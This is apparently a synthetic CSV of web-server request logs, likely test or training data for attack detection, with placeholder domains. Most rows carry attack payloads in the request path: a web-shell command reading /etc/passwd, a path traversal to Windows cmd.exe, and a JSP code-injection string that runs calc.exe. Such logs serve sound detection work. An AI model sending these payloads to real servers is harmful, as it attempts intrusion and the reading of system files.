ClientIP,ClientRequestMethod,ClientRequestPath,ClientRequestURI,ClientCountry,ClientDeviceType,ClientRequestBytes,ClientRequestHost,ClientRequestReferer
47e5:7fb6:491d:46ae:2731:3c72:1485:4900,GET,/shell.php?cmd=cat%20/etc/passwd,/theory,in,tablet,3514,porter.biz,http://www.hernandez.com/
32.44.184.1,GET,/../../../../windows/system32/cmd.exe,/want/media/street,in,tablet,4065,porter.biz,http://www.hernandez.com/
6e92:90c5:2c8a:f3ea:cd6a:fb84:4e63:efa4,GET,/shell.php?cmd=cat%20/etc/passwd,/follow,in,tablet,3514,porter.biz,http://www.hernandez.com/
da60:af59:b109:3243:ace:ff02:2d3f:5507,GET,/../../../../windows/system32/cmd.exe,/want/media/street,in,tablet,4065,porter.biz,http://www.hernandez.com/
57.59.211.222,GET,/shell.php?cmd=cat%20/etc/passwd,/want/media/street,us,tablet,6515,brown.net,http://www.hernandez.com/
135.161.89.192,GET,/../../../../windows/system32/cmd.exe,/want/media/street,us,tablet,6596,brown.net,http://www.hernandez.com/
116.254.36.200,GET,/../../../../windows/system32/cmd.exe,/want/media/street,us,tablet,6592,brown.net,http://www.hernandez.com/
4.246.56.37,GET,/shell.php?cmd=cat%20/etc/passwd,/want/media/street,in,tablet,4072,porter.biz,http://www.hernandez.com/
212.91.40.196,GET,/shell.php?cmd=cat%20/etc/passwd,/want/media/street,in,desktop,4074,porter.biz,http://www.hernandez.com/
cb5c:ef4c:2d32:8473:8f11:3a55:1ac6:21d0,GET,/../../../../windows/system32/cmd.exe,/want/media/street,in,tablet,4074,porter.biz,http://price-howard.com/
196.9.231.148,GET,/shell.php?cmd=cat%20/etc/passwd,/want/media/street,us,desktop,6508,brown.net,http://www.hernandez.com/
223.200.143.57,GET,/../../../../windows/system32/cmd.exe,/want/media/street,in,desktop,4094,porter.biz,http://www.hernandez.com/
218.83.247.217,GET,/shell.php?cmd=cat%20/etc/passwd,/open/together/scene,us,tablet,6677,brown.net,http://www.hernandez.com/
69.182.1.96,GET,/../../../../windows/system32/cmd.exe,/open/together/scene,in,desktop,3504,porter.biz,http://www.hernandez.com/
144.71.122.188,GET,/shell.php?cmd=cat%20/etc/passwd,/clear,in,desktop,3537,porter.biz,http://www.hernandez.com/
209.158.28.49,GET,/../../../../windows/system32/cmd.exe,/open/together/scene,us,tablet,6583,brown.net,http://www.hernandez.com/
77.99.249.100,GET,/shell.php?cmd=cat%20/etc/passwd,/media/animal/tell,in,desktop,3505,porter.biz,http://www.hernandez.com/
38.90.38.169,GET,/../../../../windows/system32/cmd.exe,/want/media/street,us,desktop,6466,brown.net,http://www.hernandez.com/
117.200.193.5,GET,/shell.php?cmd=cat%20/etc/passwd,/want/media/street,us,desktop,5232,brown.net,http://www.hernandez.com/
21.70.83.110,GET,/shell.php?cmd=cat%20/etc/passwd,/region/let,in,desktop,3440,porter.biz,http://www.hernandez.com/
198.52.149.19,GET,/shell.php?cmd=cat%20/etc/passwd,/region/let,in,tablet,3423,porter.biz,http://www.hernandez.com/
78.14.143.33,GET,/shell.php?cmd=cat%20/etc/passwd,/about/partner/determine,in,desktop,4087,porter.biz,http://www.hernandez.com/
209.158.28.49,GET,/../../../../windows/system32/cmd.exe,/about/partner/determine,us,tablet,6524,moore.com,http://www.hernandez.com/
203.94.132.82,GET,/../../../../windows/system32/cmd.exe,/about/partner/determine,in,desktop,3434,porter.biz,http://www.hernandez.com/
62.233.82.185,POST,/shell.php?cmd=cat%20/etc/passwd,/green/direction,us,desktop,7021,brown-stevens.org,http://www.hernandez.com/
222.30.33.183,POST,/shell.php?cmd=cat%20/etc/passwd,/green/direction,us,desktop,7050,brown-stevens.org,http://www.hernandez.com/
82.212.151.84,POST,/shell.php?cmd=cat%20/etc/passwd,/carry,us,desktop,6058,kirby.info,http://www.hernandez.com/
23.3.40.72,POST,/shell.php?cmd=cat%20/etc/passwd,/carry,us,desktop,4612,kirby.info,http://www.hernandez.com/
179.20.139.255,GET,/shell.php?cmd=cat%20/etc/passwd,/serious/she/drive,in,desktop,4073,porter.biz,http://www.hernandez.com/
652e:7106:da51:8108:75e5:2a52:4dc3:88ef,GET,/shell.php?cmd=cat%20/etc/passwd,/find/color/relate/power,in,tablet,3520,porter.biz,http://www.hernandez.com/
b086:3107:ca69:fb9a:5a6b:118b:bb99:77c8,GET,/shell.php?cmd=cat%20/etc/passwd,/according/provide/mouth/about,in,tablet,3536,porter.biz,http://www.hernandez.com/
6.184.51.168,POST,/../../../../windows/system32/cmd.exe,/idea/many/rule/hold,us,tablet,6313,brown.net,http://www.hernandez.com/
129.53.13.62,POST,/../../../../windows/system32/cmd.exe,/idea/many/rule/hold,us,tablet,6222,brown.net,http://www.hernandez.com/
219.174.86.216,GET,/shell.php?cmd=cat%20/etc/passwd,/authority,us,tablet,6345,acosta.com,http://www.hernandez.com/
215.173.246.58,POST,/shell.php?cmd=cat%20/etc/passwd,/write/toward/story,us,desktop,4679,kirby.info,http://www.hernandez.com/
218.83.247.217,POST,/../../../../windows/system32/cmd.exe,/write/toward/story,us,desktop,4673,kirby.info,http://www.hernandez.com/
150.101.20.65,GET,/shell.php?cmd=cat%20/etc/passwd,/middle,in,tablet,3915,porter.biz,https://martinez-zimmerman.info/
12.97.177.2,GET,/shell.php?cmd=cat%20/etc/passwd,/middle,in,tablet,3888,porter.biz,http://www.hernandez.com/
1fbe:d264:f863:2f7d:ba24:4fea:3510:3b35,GET,/../../../../windows/system32/cmd.exe,/middle,in,tablet,3958,porter.biz,http://www.hernandez.com/
134.36.45.66,GET,/../../../../windows/system32/cmd.exe,/how/very,in,desktop,4187,porter.biz,http://www.hernandez.com/
143.4.1.39,GET,/../../../../windows/system32/cmd.exe,/want/think/event,us,desktop,5441,pearson.com,http://www.hernandez.com/
28.75.189.25,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,us,tablet,5359,pearson.com,http://www.hernandez.com/
8.22.220.208,GET,/../../../../windows/system32/cmd.exe,/want/think/event,us,desktop,5367,pearson.com,https://www.rivera.com/
129.250.178.34,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,us,tablet,5392,pearson.com,http://www.hernandez.com/
146.239.91.195,GET,/../../../../windows/system32/cmd.exe,/want/think/event,us,desktop,5357,pearson.com,http://www.hernandez.com/
130.119.37.169,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,us,desktop,5371,pearson.com,http://www.hernandez.com/
208.254.32.147,GET,/../../../../windows/system32/cmd.exe,/want/think/event,in,tablet,3434,porter.biz,http://www.hernandez.com/
141.148.116.60,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,us,tablet,5341,pearson.com,http://www.hernandez.com/
c9bc:1673:d86f:4437:83ce:7598:cc81:175,GET,/../../../../windows/system32/cmd.exe,/want/think/event,in,tablet,3465,porter.biz,http://www.hernandez.com/
77.221.81.254,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,us,desktop,5341,pearson.com,http://www.hernandez.com/
172.42.231.206,GET,/../../../../windows/system32/cmd.exe,/want/think/event,in,tablet,4049,porter.biz,http://www.hernandez.com/
177.129.214.9,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,in,desktop,3464,porter.biz,http://www.hernandez.com/
111.55.169.136,GET,/../../../../windows/system32/cmd.exe,/want/think/event,us,tablet,5417,pearson.com,http://www.hernandez.com/
179.11.123.206,GET,/../../../../windows/system32/cmd.exe,/want/think/event,us,tablet,5417,pearson.com,http://www.hernandez.com/
122.224.10.185,GET,/shell.php?cmd=cat%20/etc/passwd,/want/think/event,in,tablet,3437,porter.biz,http://www.hernandez.com/
f019:72f2:a99f:3e95:4036:8880:6ed4:5564,GET,/shell.php?cmd=cat%20/etc/passwd,/teacher,in,mobile,5322,walters-thompson.com,https://ruiz-oconnor.com/
acfc:c098:ee0:25c5:b8b3:c2d3:26d8:88f2,GET,/../../../../windows/system32/cmd.exe,/crime/level/and/particular,in,mobile,6687,walters-thompson.com,https://ruiz-oconnor.com/
55.0.37.71,GET,/shell.php?cmd=cat%20/etc/passwd,/green,in,mobile,4871,walters-thompson.com,https://ruiz-oconnor.com/
199.105.97.37,POST,/../../../../windows/system32/cmd.exe,/business/big/seven,in,desktop,4038,joseph.org,http://www.hernandez.com/
af77:a36b:cc35:24fd:a293:81c6:838:6a5d,POST,/../../../../windows/system32/cmd.exe,/business/big/seven,in,tablet,4020,joseph.org,http://www.hernandez.com/
9fdc:1555:2aaf:23d6:d47e:cc1e:6549:10cd,POST,/shell.php?cmd=cat%20/etc/passwd,/business/big/seven,in,tablet,4050,joseph.org,http://www.hernandez.com/
57.112.34.158,GET,/../../../../windows/system32/cmd.exe,/whom/ever/box/nothing,us,desktop,6499,acosta.com,http://www.hernandez.com/
86.248.156.68,GET,/../../../../windows/system32/cmd.exe,/whom/ever/box/nothing,us,tablet,6401,acosta.com,http://www.hernandez.com/
185.24.37.122,GET,/../../../../windows/system32/cmd.exe,/whom/ever/box/nothing,us,tablet,6528,acosta.com,http://www.hernandez.com/
133.157.216.48,GET,/../../../../windows/system32/cmd.exe,/whom/ever/box/nothing,us,tablet,6598,acosta.com,http://www.hernandez.com/
e984:36b5:7795:fdee:464e:57c9:9516:d969,GET,/shell.php?cmd=cat%20/etc/passwd,/piece/statement/common/Mrs,in,desktop,4138,porter.biz,http://www.hernandez.com/
657f:a061:98e2:663a:585b:2405:e154:e8f4,GET,/shell.php?cmd=cat%20/etc/passwd,/piece/statement/common/Mrs,in,tablet,4113,porter.biz,http://www.hernandez.com/
45.36.137.66,GET,/../../../../windows/system32/cmd.exe,/piece/statement/common/Mrs,in,tablet,4089,porter.biz,http://www.hernandez.com/
151.167.78.158,GET,/shell.php?cmd=cat%20/etc/passwd,/piece/statement/common/Mrs,in,desktop,4114,porter.biz,http://www.hernandez.com/
8be3:8987:efb7:871c:d5e9:1a5:b399:3cb7,GET,/shell.php?cmd=cat%20/etc/passwd,/piece/statement/common/Mrs,in,tablet,4092,porter.biz,http://www.hernandez.com/
213.28.133.179,GET,/shell.php?cmd=cat%20/etc/passwd,/piece/statement/common/Mrs,in,desktop,3447,porter.biz,http://www.hernandez.com/
93.22.82.224,GET,/look/executive/federal,/look/executive/federal,in,mobile,5736,walters-thompson.com,http://www.owens.com/
101.78.158.241,OPTIONS,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/fish,in,mobile,6574,porter.biz,http://www.hernandez.com/
189.223.76.6,GET,/look/executive/federal,/look/executive/federal,in,mobile,6439,walters-thompson.com,http://www.owens.com/
b360:d30c:b04a:4477:86a7:3d05:bf74:e189,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/it/letter,in,desktop,5150,marshall-odonnell.net,http://johnson.org/
129.207.3.198,GET,/look/executive/federal,/look/executive/federal,in,mobile,5163,walters-thompson.com,http://www.owens.com/
71c9:def:aa09:375e:2614:4e87:7c2:43c3,GET,/look/executive/federal,/look/executive/federal,in,mobile,5368,walters-thompson.com,http://www.owens.com/
156.12.10.185,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/professor/occur,in,desktop,2328,porter.biz,http://www.hernandez.com/
74.0.153.226,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/practice/answer/kind/ready,in,desktop,3449,porter.biz,http://www.hernandez.com/
39.145.115.2,GET,/look/executive/federal,/look/executive/federal,in,mobile,5046,walters-thompson.com,http://www.owens.com/
212.236.65.133,GET,/look/executive/federal,/look/executive/federal,in,mobile,4972,walters-thompson.com,http://www.owens.com/
20.186.223.8,GET,/executive/challenge,/executive/challenge,us,tablet,6575,brown.net,http://www.hernandez.com/
c5ab:828a:6075:81da:5f5a:4965:c1be:68aa,OPTIONS,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/spring/toward/music,in,desktop,2989,porter.biz,http://www.hernandez.com/
b346:5198:951c:7abd:b91a:672b:d09f:9cb3,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/white/drive/speech,in,mobile,3099,davenport.biz,http://www.bennett.net/
211.6.250.212,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/view/require,in,desktop,2906,porter.biz,http://www.hernandez.com/
159.197.110.50,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/view/require,us,desktop,4237,jackson.com,http://www.hernandez.com/
16.149.55.96,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/week/oil/recognize/almost,in,mobile,2806,porter.biz,http://www.hernandez.com/
2723:3bb1:aa56:d4f4:3f2:2779:2728:c5f6,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/different/people/bed/career,in,mobile,4177,walters-thompson.com,http://www.owens.com/
94.35.151.15,GET,/look/executive/federal,/look/executive/federal,in,mobile,3775,walters-thompson.com,http://www.owens.com/
125.90.21.79,GET,/executive/PM/city,/executive/PM/city,in,mobile,2712,porter.biz,http://www.hernandez.com/
46.46.99.224,GET,/look/executive/federal,/look/executive/federal,in,mobile,5437,walters-thompson.com,http://www.owens.com/
85.186.37.227,GET,/look/executive/federal,/look/executive/federal,in,mobile,4363,walters-thompson.com,http://www.owens.com/
ed54:da66:9ad3:e2bf:d215:f825:9624:b0c8,GET,/look/executive/federal,/look/executive/federal,in,mobile,6052,walters-thompson.com,http://www.owens.com/
115.150.48.86,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/oil/top/both,in,mobile,2739,porter.biz,http://www.hernandez.com/
35dc:3d2d:a42c:90f8:fb1f:5d98:7e4d:5655,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/can/source,in,tablet,3451,porter.biz,http://www.hernandez.com/
1b3c:ab01:d7db:9067:706a:4305:a837:82c1,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/remain/position/street/door,in,mobile,4637,walters-thompson.com,http://www.owens.com/
170.37.139.73,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/finally/always/station,in,mobile,2804,porter.biz,http://www.hernandez.com/
222.2.129.147,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/analysis/control,in,desktop,3710,porter.biz,http://www.hernandez.com/
193.206.235.29,POST,/executive/book,/executive/book,us,desktop,4334,mason.com,http://www.hernandez.com/
fdc6:1c21:fe0b:5681:9736:5d9a:f8ad:9b24,GET,/executive,/executive,in,mobile,2834,porter.biz,http://www.hernandez.com/
61.54.40.181,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/threat/black,in,mobile,4897,walters-thompson.com,http://www.owens.com/
2509:64ee:9501:8996:5669:8d2:6cf:8a69,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/center/become/try/story,in,tablet,3944,porter.biz,http://www.hernandez.com/
157.224.86.15,GET,/executive/soldier,/executive/soldier,fr,desktop,2828,brown.net,http://www.hernandez.com/
104.75.117.5,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/month/thing/read/whether,in,mobile,5040,walters-thompson.com,http://www.owens.com/
17.119.72.224,GET,/learn/son/executive/page,/learn/son/executive/page,us,desktop,3238,porter.biz,https://powell-brady.com/
90.178.50.209,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/page,us,desktop,6319,acosta.com,http://www.hernandez.com/
38.71.226.68,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/treat/age/visit/dream,in,desktop,3463,porter.biz,http://johnson.org/
89.240.61.108,GET,/executive/wind/environmental,/executive/wind/environmental,us,tablet,6488,brown.net,http://www.hernandez.com/
9bc:913e:1b80:85a9:ed13:94ee:bbb6:466,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/painting,in,mobile,2893,davenport.biz,https://www.watson.com/
2.44.175.176,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/government/scientist/space,in,mobile,2808,porter.biz,http://www.hernandez.com/
204.74.76.31,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/small/day/nation,us,desktop,808,garcia.biz,http://www.hernandez.com/
141.148.116.60,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/guess,us,desktop,6492,acosta.com,http://www.hernandez.com/
196.9.231.148,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/seat/great/owner,us,desktop,5370,acosta.com,http://www.hernandez.com/
222.30.33.183,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/technology/cover,us,desktop,6686,acosta.com,http://www.hernandez.com/
128.3.125.57,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/technology/cover,us,tablet,6621,acosta.com,http://www.hernandez.com/
56.172.84.231,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/seat/great/owner,us,desktop,5386,acosta.com,http://www.hernandez.com/
38.90.38.169,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/guess,us,tablet,6567,acosta.com,http://www.hernandez.com/
136.1.142.245,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/explain/space/sign,in,tablet,4050,porter.biz,http://www.hernandez.com/
187.58.154.169,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/set/fill,us,desktop,6471,acosta.com,http://www.hernandez.com/
28.75.189.25,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/set/fill,us,mobile,5637,acosta.com,http://www.holmes-barrera.com/
217.119.19.158,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/turn/everybody/must,us,desktop,6474,acosta.com,http://www.hernandez.com/
90.178.50.209,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/turn/everybody/must,us,desktop,6492,acosta.com,http://www.hernandez.com/
53.254.234.52,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/turn/everybody/must,us,desktop,6497,acosta.com,http://www.hernandez.com/
bc9d:b125:40ab:faef:ab3b:3ef9:fed4:df47,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/traditional/lawyer/head/strong,in,tablet,3447,porter.biz,http://www.hernandez.com/
7.113.8.157,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/enough,us,tablet,6452,acosta.com,http://www.hernandez.com/
200.51.13.20,POST,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/sound/explain/suggest,in,desktop,3560,joseph.org,https://www.rogers.com/
51.59.163.227,POST,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/sound/explain/suggest,in,tablet,2900,joseph.org,http://www.hernandez.com/
2091:4b46:1b75:1747:a321:3542:c82:7d4d,POST,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/war,in,desktop,5185,porter.biz,http://www.hernandez.com/
171.156.98.82,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/personal/blood/none/force,in,tablet,3421,porter.biz,http://www.hernandez.com/
70.56.125.109,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/personal/blood/none/force,in,tablet,4057,porter.biz,http://www.hernandez.com/
144.43.7.43,POST,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/street,us,tablet,14255,brown.net,http://www.hernandez.com/
73f7:e5b6:2346:8f66:6341:7a80:d5ac:8bd1,POST,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/street,in,tablet,11187,porter.biz,http://www.hernandez.com/
54.219.86.97,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/want/media/street,in,desktop,4064,porter.biz,http://www.hernandez.com/
206.1.198.58,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/clear,in,tablet,3512,porter.biz,http://www.hernandez.com/
185.24.37.122,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/keep/put/over/white,us,tablet,6566,brown.net,http://www.hernandez.com/
179.11.123.206,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/person,us,desktop,6362,brown.net,http://www.hernandez.com/
215.74.105.105,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/about/partner/determine,in,tablet,3436,porter.biz,http://www.hernandez.com/
d173:af56:cf1d:2570:52f:4ae3:eb94:cd4,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/sense/especially,in,tablet,3427,porter.biz,http://www.hernandez.com/
113.19.13.53,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/serious/she/drive,us,desktop,6503,moore.com,http://www.hernandez.com/
63.79.115.181,GET,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",/carry,in,tablet,3497,porter.biz,http://www.hernandez.com/
